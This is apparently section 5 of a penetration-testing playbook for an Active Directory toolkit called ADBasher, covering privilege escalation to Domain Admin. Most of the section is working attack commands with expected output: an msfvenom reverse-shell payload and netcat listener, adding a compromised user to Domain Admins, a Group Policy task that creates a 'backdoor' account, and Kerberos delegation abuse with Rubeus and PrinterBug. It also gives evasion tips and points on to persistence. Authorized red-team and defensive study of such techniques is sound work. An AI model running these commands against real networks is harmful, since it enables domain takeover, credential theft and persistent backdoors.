## 5. Privilege Escalation Paths

Once you have valid credentials, the next objective is to escalate privileges to Domain Admin or equivalent. This section covers common privilege escalation techniques in Active Directory environments.

### 5.1 Exploiting Misconfigurations

**Objective:** Identify and exploit common AD misconfigurations that allow privilege escalation.

#### Unquoted Service Paths

**Technique:** Exploit services running with unquoted paths and spaces to execute arbitrary code.

**Manual Detection:**

```bash
# Using CrackMapExec with admin credentials
crackmapexec smb 192.168.10.0/24 -u administrator -p 'Password123' \
  --local-auth -M enum_avproducts

# Using PowerShell (requires shell access)
Get-WmiObject -Class Win32_Service | Where-Object {
  $_.PathName -notmatch '^"' -and $_.PathName -match ' '
} | Select-Object Name, PathName, StartName
```

**ADBasher Integration:**

```bash
# Privilege escalation scanner (automated)
python3 "7 privesc/automated/privesc_scanner.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target-range 192.168.10.0/24
```

**Expected Output:**

```text
[INFO] Scanning for privilege escalation opportunities
[+] Unquoted service path found: C:\Program Files\Vulnerable App\service.exe
[+] Service runs as: NT AUTHORITY\SYSTEM
[+] Exploitable: YES (write access to C:\Program Files\Vulnerable)
[+] Stored in database as HIGH severity finding
```

**Exploitation (if write access exists):**

```bash
# Create malicious executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.5.100 LPORT=443 \
  -f exe -o Program.exe

# Upload to C:\Program Files\Vulnerable.exe
# When service restarts, executes Vulnerable.exe instead of intended path

# Start listener
nc -lvnp 443
```

**Success Metrics:**

- Unquoted service paths identified
- Write permissions verified
- Code execution as SYSTEM achieved

**OPSEC Rating:** **High** - File creation and service manipulation generates logs (Event ID 4697, 7045).

#### Weak File Permissions

**Technique:** Identify files with weak ACLs that can be overwritten to execute code.

**Detection:**

```bash
# Using AccessChk (Sysinternals)
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

# Check for writable service binaries
accesschk.exe -uwcqv "Authenticated Users" *
```

**Remediation (for reporting):**

```
Finding: Weak Service Binary Permissions
Severity: CRITICAL
Affected: VulnerableService (C:\Services\vulnerable.exe)

Current ACL: BUILTIN\Users:(F) Full Control
Recommended: Remove Users group, grant only SYSTEM and Administrators
```

### 5.2 ACL Abuse Techniques

**Objective:** Exploit misconfigured Access Control Lists to add users to privileged groups or reset passwords.

#### GenericAll on User Object

**Attack Flow:**

```
┌──────────────────────────────────────────────────────┐
│         GenericAll ACL Abuse Attack Flow             │
├──────────────────────────────────────────────────────┤
│ 1. Enumerate ACLs via BloodHound                     │
│ 2. Identify user with GenericAll on Domain Admins   │
│ 3. Add compromised user to Domain Admins group      │
│ 4. Authenticate as Domain Admin                     │
└──────────────────────────────────────────────────────┘
```

**BloodHound Query:**

```cypher
# In BloodHound GUI, run:
MATCH (u:User {owned:true}), (g:Group {name:"DOMAIN ADMINS@CONTOSO.LOCAL"}),
p=shortestPath((u)-[*1..]->(g))
RETURN p
```

**Manual Exploitation:**

```bash
# Using PowerView (PowerShell)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'compromised.user'

# Using net command (from Windows)
net group "Domain Admins" compromised.user /add /domain

# Using Impacket (Linux)
addcomputer.py -computer-name 'FAKEDC$' -computer-pass 'password' \
  -dc-ip 192.168.10.10 'contoso.local/compromised.user:password'
```

**Expected Output:**

```
[+] User compromised.user added to Domain Admins
[+] Verifying membership...
[+] SUCCESS: compromised.user is now Domain Admin
```

**Success Metrics:**

- ACL abuse path identified in BloodHound
- Compromised user added to privileged group
- Domain Admin access achieved

**OPSEC Considerations:**

- **Detection Likelihood:** **Medium-High**
- **IOCs:** Event ID 4728 (Member added to security-enabled global group)
- **Evasion:** Create new group with similar privileges instead of adding to Domain Admins

#### WriteDacl Permission

**Technique:** Modify DACLs to grant yourself additional permissions.

**Manual Exploitation:**

```powershell
# Grant yourself GenericAll on target object
Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
  -PrincipalIdentity compromised.user -Rights All

# Now use GenericAll to add yourself to the group
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'compromised.user'
```

**Success Metrics:**

- DACL successfully modified
- New permissions granted
- Privilege escalation achieved

### 5.3 GPO Manipulation

**Objective:** Modify Group Policy Objects to execute code on domain-joined systems.

**Prerequisites:** Write access to GPO objects (identified via BloodHound).

**Attack Flow:**

```
┌────────────────────────────────────────────────────┐
│         GPO Abuse Attack Flow                      │
├────────────────────────────────────────────────────┤
│ 1. Identify GPOs you can modify (BloodHound)      │
│ 2. Add malicious scheduled task to GPO            │
│ 3. Wait for GPO refresh (90-120 minutes)          │
│ 4. Task executes on all systems in GPO scope      │
│ 5. Code runs as SYSTEM                            │
└────────────────────────────────────────────────────┘
```

**BloodHound Query:**

```cypher
MATCH (u:User {owned:true}), (g:GPO), p=shortestPath((u)-[*1..]->(g))
RETURN p
```

**Manual GPO Exploitation:**

```bash
# Using SharpGPOAbuse (Windows)
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "UpdateTask" \
  --Author CONTOSO\Administrator --Command "cmd.exe" \
  --Arguments "/c net user backdoor Password123 /add" \
  --GPOName "Default Domain Policy"

# Using Impacket (Linux)
# More complex, requires manual LDAP modifications
```

**Expected Output:**

```
[+] GPO modified: Default Domain Policy
[+] Scheduled task added: UpdateTask
[+] Command: net user backdoor Password123 /add
[+] Task will execute on next GPO refresh (~90-120 min)
[!] Monitoring for task execution...
```

**Success Metrics:**

- GPO modification successful
- Scheduled task created
- Code executed on target systems

**OPSEC Considerations:**

- **Detection Likelihood:** **High**
- **IOCs:**
  - Event ID 5136 (Directory Service Object Modified)
  - New scheduled task creation (Event ID 4698)
  - Unusual GPO changes

**Remediation:**

```
Finding: Write Access to GPOs
Severity: CRITICAL
Affected: 3 users have write access to production GPOs

Recommendation:
1. Restrict GPO modification to Domain Admins only
2. Implement GPO change monitoring and alerting
3. Enable auditing for GPO modifications (Event ID 5136)
```

### 5.4 Delegation Attacks

**Objective:** Exploit Kerberos delegation misconfigurations to impersonate privileged users.

#### Unconstrained Delegation

**What is Unconstrained Delegation?**

When a service has unconstrained delegation enabled, it can impersonate any user to any service. If an admin connects to this server, the server receives a TGT that can be extracted and reused.

**Attack Flow:**

```
┌──────────────────────────────────────────────────────┐
│      Unconstrained Delegation Attack Flow            │
├──────────────────────────────────────────────────────┤
│ 1. Identify servers with unconstrained delegation   │
│ 2. Gain admin access to that server                 │
│ 3. Monitor for admin TGTs (rubeus/mimikatz)         │
│ 4. Coerce admin authentication (printerbug)         │
│ 5. Extract admin TGT from LSASS                     │
│ 6. Use TGT for pass-the-ticket attack               │
└──────────────────────────────────────────────────────┘
```

**Identification via BloodHound:**

```cypher
# Query for unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

**Manual Detection:**

```bash
# Using PowerView
Get-DomainComputer -Unconstrained -Properties dnshostname

# Using LDAP query
ldapsearch -x -H ldap://dc01.contoso.local \
  -b "DC=contoso,DC=local" \
  "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  dNSHostName
```

**Exploitation:**

```bash
# Step 1: Compromise server with unconstrained delegation
# (using valid admin credentials for that system)

# Step 2: Monitor for TGTs (Rubeus on Windows)
.\Rubeus.exe monitor /interval:5

# Step 3: Coerce admin authentication (PrinterBug)
python3 printerbug.py contoso.local/user:password@DC01 FILESERVER01

# Step 4: Extract TGT from Rubeus output
# Rubeus will display captured TGT in base64

# Step 5: Import TGT
.\Rubeus.exe ptt /ticket:[base64_ticket]

# Step 6: Access domain resources as that admin
dir \\DC01\C$
```

**Expected Output:**

```
[+] Server with unconstrained delegation: FILESERVER01
[+] Coercing authentication from DC01 to FILESERVER01
[+] TGT captured: Administrator@CONTOSO.LOCAL
[+] TGT ticket:
    doIFuj... [base64 blob]
[+] Importing ticket...
[+] SUCCESS: Now authenticated as Administrator
```

**Success Metrics:**

- Unconstrained delegation server identified
- Admin TGT captured
- Successfully authenticated as admin

**OPSEC Rating:** **High** - TGT extraction triggers LSASS access alerts, authentication coercion is detectable.

#### Constrained Delegation

**Attack Flow:**

```
┌──────────────────────────────────────────────────────┐
│      Constrained Delegation Attack Flow              │
├──────────────────────────────────────────────────────┤
│ 1. Identify constrained delegation configuration    │
│ 2. Compromise account with delegation rights        │
│ 3. Request TGS for allowed service (S4U2Self)       │
│ 4. Use TGS to access target service as any user     │
└──────────────────────────────────────────────────────┘
```

**Identification:**

```bash
# Using PowerView
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto

# Expected output:
# samaccountname: svc_web
# msds-allowedtodelegateto: {CIFS/FILESERVER01.contoso.local}
```

**Exploitation:**

```bash
# Using Rubeus
.\Rubeus.exe s4u /user:svc_web /rc4:[NTLM_hash] \
  /impersonateuser:Administrator /msdsspn:CIFS/FILESERVER01.contoso.local \
  /ptt

# Access target as Administrator
dir \\FILESERVER01\C$
```

**Success Metrics:**

- Constrained delegation accounts identified
- Service ticket obtained for target service
- Impersonated admin access achieved

#### Resource-Based Constrained Delegation (RBCD)

**Technique:** Abuse WriteDacl or GenericAll on computer objects to configure RBCD, then impersonate admins.

**Attack Flow:**

```bash
# Step 1: Verify write access to computer object
# (identified via BloodHound)

# Step 2: Configure RBCD on target computer
Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount ATTACKER$

# Step 3: Request service ticket impersonating admin
.\Rubeus.exe s4u /user:ATTACKER$ /rc4:[hash] \
  /impersonateuser:Administrator /msdsspn:cifs/TARGET.contoso.local /ptt

# Step 4: Access target as admin
dir \\TARGET\C$
```

**Expected Output:**

```
[+] RBCD configured on TARGET$
[+] Requesting TGS as Administrator
[+] Service ticket obtained
[+] SUCCESS: Accessing TARGET as Administrator
```

**Success Metrics:**

- RBCD successfully configured
- Service ticket obtained as admin
- Lateral movement achieved

**OPSEC Rating:** **Medium** - RBCD configuration generates Event ID 5136, but may blend with normal AD changes.

---

## Common Privilege Escalation Decision Tree

```
┌─────────────────────────────────────────────┐
│ Do you have valid domain credentials?      │
└──────────┬──────────────────────────────────┘
           │
           ├─ Run BloodHound collection
           ├─ Identify attack paths
           │
           ├─ GenericAll/WriteDacl on privileged group?
           │  └─ YES → Add user to group (§5.2)
           │  └─ NO  → Continue
           │
           ├─ Write access to GPO?
           │  └─ YES → GPO abuse (§5.3)
           │  └─ NO  → Continue
           │
           ├─ Delegation rights found?
           │  └─ YES → Delegation attacks (§5.4)
           │  └─ NO  → Continue
           │
           └─ Admin on any workstation?
              └─ YES → Credential dumping (§6.1)
              └─ NO  → Continue enumeration
```

**Next Steps After Privilege Escalation:**

1. **Domain Admin Achieved:** Proceed to persistence (Section 7)
2. **Partial Escalation:** Continue lateral movement (Section 6)
3. **No Escalation Path:** Re-enumerate, search for new vectors
